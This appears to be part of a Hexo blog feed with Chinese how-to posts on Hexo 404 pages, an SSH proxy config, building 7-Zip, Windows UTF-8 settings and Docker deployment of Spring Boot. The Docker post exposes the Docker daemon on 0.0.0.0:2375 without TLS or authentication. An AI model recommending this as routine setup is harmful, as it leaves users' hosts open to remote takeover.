      <content type="html"><![CDATA[<p>网上都是这两种方法，但是会导致网页只有body里面的内容，即hexo处理后有一些标签消失了，这里将介绍<a href="#%E6%88%91%E7%9A%84%E6%96%B9%E6%A1%88">第三种方法</a>解决。</p><h5 id="网上常见的两种方法"><a href="#网上常见的两种方法" class="headerlink" title="网上常见的两种方法"></a>网上常见的两种方法</h5><p>第一种方法是使用Hexo提供的跳过渲染配置，适用于整个目录的设置。具体步骤，打开博客根目录<code>_config.yml</code>，找到其中<code>skip_render</code>项，这个项目用来配置<code>/source/</code>中需要跳过渲染的文件或目录，例如希望跳过<code>/source/test/</code>里的所有文件渲染，可以配置为：</p><figure class="highlight avrasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">skip_render:</span> test<span class="comment">/**</span></span><br></pre></td></tr></tbody></table></figure><p>匹配规则是一种类似正则的规则，官方给出的参考是<a href="https://github.com/isaacs/minimatch">这个</a>。另外在测试这个功能的时候发现，Hexo的内部缓存不是特别好用，有时候你修改了配置但生成出来的内容不一定及时应用了新配置，最好在生成之前执行一下<code>hexo clean</code>命令，清除掉旧的生成文件和缓存。</p><p>第二种方法是给单个文件添加不应用模板的标记，适用于个别特殊文件的处理。例如我们的网站如果要使用百度统计，往往需要在根目录放一个html格式的验证文件，这个文件默认也会经过用主题模板渲染，避免渲染的办法就是在文件头部添加如下内容：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">layout:</span> <span class="literal">false</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><h5 id="我的方案"><a href="#我的方案" class="headerlink" title="我的方案"></a>我的方案</h5><p>可是我实践以后发现hexo还是对网页进行了改动，&lt;body&gt;&lt;html&gt;等标签都不见了,只剩下下面的内容。</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"error-page"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"covers-main w3layouts"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main-cover w3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.html"</span> <span class="attr">class</span>=<span class="string">"logo"</span>&gt;</span>Web Error Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"cover-para w3ls"</span>&gt;</span>404<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span> <span class="attr">class</span>=<span class="string">"form-title"</span>&gt;</span>UH OH! You're lost.<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"form-text"</span>&gt;</span>The page you are looking for does not exist. How you got here is a mystery. But you can click the button below to go back to the previous page <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:history.go(-1);"</span> <span class="attr">class</span>=<span class="string">"back-button"</span>&gt;</span>Go Back<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span> <span class="attr">class</span>=<span class="string">"back-button"</span>&gt;</span>Back to Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>后来发现只要放在主题文件夹的source就能输出完整页面了，如\themes\xxxxxx\source,如下代码所示，消失的标签又回来了。</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"keywords"</span> <span class="attr">content</span>=<span class="string">"The page you are looking for does not exist."</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/404/css/style.css"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">media</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/404/css/font-awesome.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"error-page"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"covers-main w3layouts"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main-cover w3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.html"</span> <span class="attr">class</span>=<span class="string">"logo"</span>&gt;</span>Web Error Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"cover-para w3ls"</span>&gt;</span>404<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span> <span class="attr">class</span>=<span class="string">"form-title"</span>&gt;</span>UH OH! You're lost.<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"form-text"</span>&gt;</span>The page you are looking for does not exist. How you got here is a mystery. But you can click the button below to go back to the previous page <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:history.go(-1);"</span> <span class="attr">class</span>=<span class="string">"back-button"</span>&gt;</span>Go Back<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span> <span class="attr">class</span>=<span class="string">"back-button"</span>&gt;</span>Back to Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">"https://static.cloudflareinsights.com/beacon.min.js"</span> <span class="attr">data-cf-beacon</span>=<span class="string">'{"rayId":"69596e22ad08eb79","version":"2021.8.1","r":1,"token":"4c34ab8739eb4bf09573777b5c48b854","si":10}'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> hexo </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Win10 给 ssh 加上代理</title>
      
      
      <link href="/cn/posts/3664919065/"/>
      
      
      <url>/cn/posts/3664919065/</url>
      
      
        
      <content type="html"><![CDATA[<p>直接编辑<code>~/.ssh/config</code>，没有就创建一个</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ProxyCommand C:\Program Files\Git\mingw64\bin\connect.exe -S 127.0.0.1:10808 -a none %h %p</span><br><span class="line"></span><br><span class="line">Host github.com</span><br><span class="line">  User git</span><br><span class="line">  Port 22</span><br><span class="line">  Hostname github.com</span><br><span class="line">  IdentityFile <span class="string">"C:\Users\79287\.ssh\id_rsa"</span></span><br><span class="line">  TCPKeepAlive <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">Host ssh.github.com</span><br><span class="line">  User git</span><br><span class="line">  Port 443</span><br><span class="line">  Hostname ssh.github.com</span><br><span class="line">  <span class="comment"># 注意修改路径为你的路径</span></span><br><span class="line">  IdentityFile <span class="string">"C:\Users\79287\.ssh\id_rsa"</span></span><br><span class="line">  TCPKeepAlive <span class="built_in">yes</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Windows </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>7zip的编译</title>
      
      
      <link href="/cn/posts/25908/"/>
      
      
      <url>/cn/posts/25908/</url>
      
      
        
      <content type="html"><![CDATA[<h4 id="编译7z-dll"><a href="#编译7z-dll" class="headerlink" title="编译7z.dll"></a>编译7z.dll</h4><h5 id="1-下载源代码并打开"><a href="#1-下载源代码并打开" class="headerlink" title="1.下载源代码并打开"></a>1.下载源代码并打开</h5><p>下载地址：<a href="https://www.7-zip.org/download.html">https://www.7-zip.org/download.html</a></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/25908/image-20200702201430649.png" alt="image-20200702201430649"></p><p>用vs打开%7z_source%\CPP\7zip\Bundles\Format7zF\Format7z.dsw</p><p>在7zCrcOpt.asm和AesOpt.asm两个文件上右键属性，修改其配置信息，如图</p><p>这里是由于作者用的VB6，你打开宏设置就知道这个路径是在<a href="https://visualstudio.microsoft.com/vs/">Visual Studio 2019</a>是错的</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/25908/image-20200702145129113.png" alt="image-20200702145129113"></p><p>如果要编译64位的</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/25908/image-20200702151131634.png" alt="image-20200702151131634"></p><p>对于 error LNK2026 模块对于 SAFESEH 映像是不安全的解决</p><p>在其它选项添加如下内容</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/SAFESEH:NO </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/25908/image-20200702145334265.png" alt="image-20200702145334265"></p><h5 id="2-编译"><a href="#2-编译" class="headerlink" title="2.编译"></a><strong>2.编译</strong></h5><p>7z.dlll文件会编译到你链接器部分设置的位置</p><blockquote><p>其他部分考完试再更新</p></blockquote>]]></content>
      
      
      
      
    
    </entry>
    <entry>
      
      
      <title>设置Windows10的默认编码为UTF-8以及设置后的已知问题</title>
      
      
      <link href="/cn/posts/49861/"/>
      
      
      <url>/cn/posts/49861/</url>
      
      
        
      <content type="html"><![CDATA[<h4 id="设置方法"><a href="#设置方法" class="headerlink" title="设置方法"></a>设置方法</h4><p>设置方法：控制面板-&gt;区域-&gt;管理&gt;更改系统区域设置</p><p>设置好后，重启，系统编码即变为UTF-8格式。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49861/image-20200702124934940.png" alt="image-20200702124934940"></p><h4 id="已知问题："><a href="#已知问题：" class="headerlink" title="已知问题："></a>已知问题：</h4><blockquote><p>刚开始使用，还没发现更多问题，后期会继续添加</p></blockquote><h5 id="1-自定义配置文件乱码"><a href="#1-自定义配置文件乱码" class="headerlink" title="1.自定义配置文件乱码"></a>1.自定义配置文件乱码</h5><p>如下图，我在一个文件夹内写入如下内容，让文件夹显示我自定义的中文名，但是当我设置Windows为UTF-8后，此文件不会被自动更改，需要手动更改为UTF-8后方能正常使用，不然文件夹显示会乱码</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49861/image-20200702124519257.png" alt="image-20200702124519257"></p><h5 id="2-7-ZIP和WinRAR以及Windows资源管理器-打开GBK编码的zip会乱码"><a href="#2-7-ZIP和WinRAR以及Windows资源管理器-打开GBK编码的zip会乱码" class="headerlink" title="2.7-ZIP和WinRAR以及Windows资源管理器 打开GBK编码的zip会乱码"></a>2.7-ZIP和WinRAR以及Windows资源管理器 打开GBK编码的zip会乱码</h5><p>WinRAR 版本 5.90 简体中文版 </p><p>7ZIP版本：19.00</p><p>Windows 版本：19041.329</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49861/image-20200702125403723.png" alt="image-20200702125403723"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49861/image-20200702125537141.png" alt="image-20200702125537141"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49861/image-20200702125557146.png" alt="image-20200702125557146"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49861/image-20200702125703849.png" alt="image-20200702125703849"></p><h5 id="3-chm帮助文件查看器打开中文乱码"><a href="#3-chm帮助文件查看器打开中文乱码" class="headerlink" title="3.chm帮助文件查看器打开中文乱码"></a>3.chm帮助文件查看器打开中文乱码</h5><p>如下图所示，此处文件名没有乱码，但是打开后标题乱码，还有搜索时会乱码，索引和其他页面未发现乱码。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49861/image-20200702130035351.png" alt="image-20200702130035351"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/49861/image-20200702130123997.png" alt="image-20200702130123997"></p>]]></content>
      
      
      
      
    
    </entry>
    <entry>
      
      
      <title>IDEA docker部署springboot项目</title>
      
      
      <link href="/cn/posts/27992/"/>
      
      
      <url>/cn/posts/27992/</url>
      
      
        
      <content type="html"><![CDATA[<h4 id="一、docker服务器侧监听配置"><a href="#一、docker服务器侧监听配置" class="headerlink" title="一、docker服务器侧监听配置"></a>一、docker服务器侧监听配置</h4><p>centos7安装配置docker参考《<a href="https://www.cnblogs.com/zhouyu629/p/12447051.html">centos下docker安装</a>》</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/docker.service，配置完端口，下面的idea中才能连接成功。</span><br></pre></td></tr></tbody></table></figure><p> 默认使用2375端口监听，如果开有防火墙，需要把端口添加到例外。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExecStart=``/usr/bin/dockerd` `-H fd:``//` `--containerd=``/run/containerd/containerd``.sock -H tcp:``//0``.0.0.0:2375</span><br></pre></td></tr></tbody></table></figure><h4 id="二、插件安装和配置"><a href="#二、插件安装和配置" class="headerlink" title="二、插件安装和配置"></a>二、插件安装和配置</h4><p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/27992/27832-20200311095157924-52880106.png" alt="img"></p><p>配置docker连接，一定要显示Connection succcessful：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/27992/27832-20200311095752524-2049075091.png" alt="img"></p><h4 id="三、springboot项目，增加docker插件和Dockerfile配置"><a href="#三、springboot项目，增加docker插件和Dockerfile配置" class="headerlink" title="三、springboot项目，增加docker插件和Dockerfile配置"></a>三、springboot项目，增加docker插件和Dockerfile配置</h4><ol><li>依赖包和配置</li></ol><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/27992/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;com.spotify&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;docker-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt; 1.2.1&lt;/version&gt;</span><br><span class="line">                &lt;executions&gt;</span><br><span class="line">                    &lt;execution&gt;</span><br><span class="line">                        &lt;id&gt;build-image&lt;/id&gt;</span><br><span class="line">                        &lt;phase&gt;package&lt;/phase&gt;</span><br><span class="line">                        &lt;goals&gt;</span><br><span class="line">                            &lt;goal&gt;build&lt;/goal&gt;</span><br><span class="line">                        &lt;/goals&gt;</span><br><span class="line">                    &lt;/execution&gt;</span><br><span class="line">                &lt;/executions&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;imageName&gt;${project.artifactId}&lt;/imageName&gt;</span><br><span class="line">                    &lt;imageTags&gt;</span><br><span class="line">                        &lt;imageTag&gt;latest&lt;/imageTag&gt;</span><br><span class="line">                    &lt;/imageTags&gt;</span><br><span class="line">                    &lt;dockerDirectory&gt;${project.basedir}&lt;/dockerDirectory&gt;</span><br><span class="line">                    &lt;dockerHost&gt;http://10.245.202.222:2375&lt;/dockerHost&gt;</span><br><span class="line">                    &lt;resources&gt;</span><br><span class="line">                        &lt;resource&gt;</span><br><span class="line">                            &lt;targetPath&gt;/&lt;/targetPath&gt;</span><br><span class="line">                            &lt;directory&gt;${project.build.directory}&lt;/directory&gt;</span><br><span class="line">                            &lt;include&gt;${project.build.finalName}&lt;/include&gt;</span><br><span class="line">                        &lt;/resource&gt;</span><br><span class="line">                    &lt;/resources&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br></pre></td></tr></tbody></table></figure><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/27992/copycode.gif" alt="复制代码"></a></p><p>我一开始建了一个docker的文件夹，将dockerfile放到那里，实践证明不行，不允许往上层路径寻找jar包。</p><p>\2. Dockerfile配置</p><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/27992/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#指定基础镜像，在其上进行定制</span><br><span class="line">FROM java:8</span><br><span class="line"></span><br><span class="line">#维护者信息</span><br><span class="line">MAINTAINER zhouyu &lt;zhouyu629@qq.com&gt;</span><br><span class="line"></span><br><span class="line">#这里的 /tmp 目录就会在运行时自动挂载为匿名卷，任何向 /tmp 中写入的信息都不会记录进容器存储层。</span><br><span class="line">VOLUME /tmp</span><br><span class="line"></span><br><span class="line">#复制上下文目录下的target/demo-1.0.0.jar 到容器里</span><br><span class="line">COPY target/freemarker-page-demo-1.0-SNAPSHOT.jar demo-1.0.0.jar</span><br><span class="line"></span><br><span class="line">#bash方式执行，使demo-1.0.0.jar可访问</span><br><span class="line">#RUN新建立一层，在其上执行这些命令，执行结束后， commit 这一层的修改，构成新的镜像。</span><br><span class="line">RUN bash -c "touch /demo-1.0.0.jar"</span><br><span class="line"></span><br><span class="line">#声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务</span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line">#指定容器启动程序及参数   &lt;ENTRYPOINT&gt; "&lt;CMD&gt;"</span><br><span class="line">ENTRYPOINT ["java","-jar","demo-1.0.0.jar"]</span><br></pre></td></tr></tbody></table></figure><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/27992/copycode.gif" alt="复制代码"></a></p><p>执行mvn package成功</p><p> \3. 创建容器</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/27992/27832-20200311202127728-810429757.png" alt="img"></p><p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/27992/27832-20200311100136847-977682787.png" alt="img"></p><p>注意bind ports，我这里是8080:8088，前面是服务器向外暴露的端口号，8088则是application.yml里配置的应用端口号，我这里对应的tomcat端口号。</p><h4 id="四、主要问题解决"><a href="#四、主要问题解决" class="headerlink" title="四、主要问题解决"></a>四、主要问题解决</h4><p>1.xxxx-1.0-SNAPSHOT.jar中没有主清单属性 ，造成发布失败。</p><p>主要是因为springboot没有配置maven package插件，pom中新增plugin</p><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/27992/copycode.gif" alt="复制代码"></a></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/27992/copycode.gif" alt="复制代码"></a></p><ol start="2"><li>容器时间和宿主时间不一致</li></ol><p>在Dockerfile最后一行增加：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置时区</span></span><br><span class="line">RUN /bin/cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \</span><br><span class="line">  &amp;&amp; echo 'Asia/Shanghai' &gt;/etc/timezone \</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 后端 </tag>
        
            
            
        <tag> springboot </tag>
        
            
            
        <tag> java </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>springboot学习笔记</title>
      
      
      <link href="/cn/posts/59173/"/>
      
      
      <url>/cn/posts/59173/</url>
      
      
        
